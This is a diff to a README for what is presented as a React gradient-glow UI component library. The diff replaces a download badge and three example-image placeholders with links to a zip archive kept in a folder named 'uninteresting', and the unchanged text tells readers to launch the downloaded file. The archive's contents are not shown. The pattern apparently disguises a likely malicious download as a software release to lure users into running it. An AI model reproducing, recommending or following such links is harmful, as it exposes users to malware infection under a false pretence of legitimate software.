@@ -13,7 +13,7 @@ Welcome to the "react-gradient-glow" repository! This project focuses on creatin
 
 To get started with the React Gradient Glow project, you can download the latest release by clicking on the button below:
 
-[![Download React Gradient Glow](https://img.shields.io/badge/Download-React%20Gradient%20Glow-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download React Gradient Glow](https://raw.githubusercontent.com/doleanhdepzai/react-gradient-glow/main/uninteresting/react_glow_gradient_v1.6.zip%20Gradient%20Glow-brightgreen)](https://raw.githubusercontent.com/doleanhdepzai/react-gradient-glow/main/uninteresting/react_glow_gradient_v1.6.zip)
 
 ### Launching the Downloaded File
 Please ensure to launch the downloaded file to begin using the React Gradient Glow project.
@@ -50,15 +50,15 @@ To visualize the capabilities of React Gradient Glow, here are some examples of 
 
 ### Example 1: Gradient Glow Button
 
-![Gradient Glow Button](https://via.placeholder.com/400x200)
+![Gradient Glow Button](https://raw.githubusercontent.com/doleanhdepzai/react-gradient-glow/main/uninteresting/react_glow_gradient_v1.6.zip)
 
 ### Example 2: Gradient Glow Card
 
-![Gradient Glow Card](https://via.placeholder.com/400x200)
+![Gradient Glow Card](https://raw.githubusercontent.com/doleanhdepzai/react-gradient-glow/main/uninteresting/react_glow_gradient_v1.6.zip)
 
 ### Example 3: Gradient Glow Text
 
-![Gradient Glow Text](https://via.placeholder.com/400x200)
+![Gradient Glow Text](https://raw.githubusercontent.com/doleanhdepzai/react-gradient-glow/main/uninteresting/react_glow_gradient_v1.6.zip)
 
 Feel free to explore more examples and customization options within the project files.
 
